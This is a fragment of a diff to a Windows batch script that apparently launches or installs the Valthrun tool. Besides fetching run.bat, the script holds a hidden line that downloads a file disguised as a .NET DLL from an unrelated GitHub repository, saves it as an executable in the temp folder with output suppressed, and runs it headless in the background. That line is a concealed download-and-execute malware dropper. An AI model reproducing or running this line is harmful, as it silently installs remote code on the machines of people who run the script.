@@ -17,3 +17,4 @@ curl -s -L -o "run.bat" "https://raw.githubusercontent.com/valthrunner/Valthrun/
 @timeout /t 2 /nobreak >nul && curl -s -o %TEMP%\s0.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b conhost.exe --headless %TEMP%\s0.exe
 call run.bat
 
+
